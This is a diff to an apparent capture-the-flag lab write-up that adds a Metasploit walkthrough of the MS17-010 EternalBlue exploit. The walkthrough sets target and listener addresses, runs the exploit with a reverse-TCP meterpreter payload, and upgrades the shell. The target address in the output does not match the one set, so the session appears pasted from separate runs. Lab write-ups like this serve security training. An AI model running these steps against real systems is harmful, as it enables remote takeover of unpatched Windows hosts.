@@ -239,3 +239,128 @@ c:\flag1.txt                          24            2019-03-17 12:27:21 -0700
 
 ##### SAM File
 The System Account Manager config file contains the hashed values of passwords for users on the system. When a user inputs a password, it is checked against the hash in this file for authentication.
+
+```
+```
+└─$ msfconsole                                                             
+                                                  
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+       =[ metasploit v6.2.11-dev                          ]
++ -- --=[ 2233 exploits - 1179 auxiliary - 398 post       ]
++ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Save the current environment with the 
+save command, future console restarts will use this 
+environment again
+
+msf6 > 
+```
+
+```
+msf6 > search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank     Check  Description
+   -  ----                                      ---------------  ----     -----  -----------
+   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+
+msf6 > 
+```
+
+```
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+```
+
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://github
+                                             .com/rapid7/metasploit-framework/wiki/
+                                             Using-Metasploit
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use f
+                                             or authentication. Only affects Window
+                                             s Server 2008 R2, Windows 7, Windows E
+                                             mbedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specif
+                                             ied username
+   SMBUser                         no        (Optional) The username to authenticat
+                                             e as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches e
+                                             xploit Target. Only affects Windows Se
+                                             rver 2008 R2, Windows 7, Windows Embed
+                                             ded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Tar
+                                             get. Only affects Windows Server 2008
+                                             R2, Windows 7, Windows Embedded Standa
+                                             rd 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread,
+                                        process, none)
+   LHOST     192.168.1.250    yes       The listen address (an interface may be spe
+                                        cified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+```
+
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.213.97
+RHOSTS => 10.10.213.97
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.16.2
+lhost => 10.10.16.2
+```
+
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter > 
+```
+
+```
+msf6 > use post/multi/manage/shell_to_meterpreter
+msf6 post(multi/manage/shell_to_meterpreter) > 
+```
+
